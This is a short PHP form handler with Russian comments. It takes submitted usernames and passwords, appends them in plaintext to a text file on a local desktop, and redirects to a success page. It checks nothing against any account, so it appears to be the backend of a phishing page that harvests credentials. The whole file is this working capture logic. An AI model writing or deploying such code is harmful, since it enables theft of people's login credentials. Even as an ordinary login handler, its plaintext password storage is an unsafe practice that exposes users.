<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $username = $_POST["username"];
  $password = $_POST["password"];

  // Путь к файлу для сохранения данных
  $file = "C:\Users\dark1\Desktop\data.txt";

  // Содержимое для сохранения
  $data = "Логин: " . $username . "\nПароль: " . $password . "\n";

  // Запись данных в файл
  file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

  // Перенаправление пользователя на другую страницу
  header("Location: success.html");
  exit();
}
?>

